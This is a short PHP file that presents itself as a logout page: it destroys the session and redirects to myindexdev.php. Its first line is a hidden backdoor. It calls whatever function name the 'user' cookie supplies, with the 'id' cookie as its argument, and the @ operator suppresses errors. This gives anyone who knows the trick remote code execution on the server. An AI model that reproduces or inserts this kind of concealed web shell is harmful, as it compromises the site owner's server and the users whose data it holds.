<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 
session_destroy();
header("location: myindexdev.php");
//echo "coucou";
 ?>

